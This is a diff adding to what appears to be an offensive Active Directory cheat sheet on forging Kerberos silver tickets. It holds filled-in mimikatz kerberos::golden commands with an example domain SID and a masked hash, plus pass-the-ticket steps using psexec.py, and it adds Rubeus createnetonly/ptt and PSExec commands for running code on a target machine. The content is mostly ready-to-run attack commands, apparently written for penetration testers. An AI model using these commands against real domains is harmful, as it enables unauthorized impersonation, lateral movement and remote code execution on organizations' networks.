@@ -156,8 +156,12 @@ Golden tickets with "Enterprise admins" SID can be used cross forest boundaries.
 Forging a Service Ticket (ST) require machine account password (key) or NT hash of the service account.
 
 ```powershell
+# Get the domain SID
+Import-Module .\PowerView.ps1
+Get-DomainSID
+
 # Create a ticket for the service
-mimikatz $ kerberos::golden /user:USERNAME /domain:DOMAIN.FQDN /sid:DOMAIN-SID /target:TARGET-HOST.DOMAIN.FQDN /rc4:TARGET-MACHINE-NT-HASH /service:SERVICE
+mimikatz $ kerberos::golden /user:<USERNAME> /domain:<DOMAIN.FQDN> /sid:<DOMAIN-SID> /target:<TARGET-HOST.DOMAIN.FQDN> /rc4:<TARGET-MACHINE-NT-HASH> /service:<SERVICE>
 
 # Examples
 mimikatz $ /kerberos::golden /domain:adsec.local /user:ANY /sid:S-1-5-21-1423455951-1752654185-1824483205 /rc4:ceaxxxxxxxxxxxxxxxxxxxxxxxxxxxxx /target:DESKTOP-01.adsec.local /service:cifs /ptt
@@ -169,8 +173,18 @@ mimikatz $ misc::convert ccache ticket.kirbi
 root@kali:/tmp$ export KRB5CCNAME=/home/user/ticket.ccache
 root@kali:/tmp$ ./psexec.py -k -no-pass -dc-ip 192.168.1.1 AD/administrator@192.168.1.100 
 ```
+* Creating a sacrificial process
+```cmd
+# New process will **NOT** contain your new ticket
+Rubeus.exe createnetonly /program:<program> /show
 
-Interesting services to target with a silver ticket :
+# Loading ptt in newly created sacrificial process (Assuming new process is cmd.exe)
+Rubeus.exe ptt /ticket:<ticket.kirbi>
+
+# Executing PSExec with newly imported ticket
+PSExec.exe -accepteula \\<target-machine-fqdn> <command>
+```
+* Interesting services to target with a silver ticket :
 
 | Service Type                                | Service Silver Tickets | Attack |
 |---------------------------------------------|------------------------|--------|
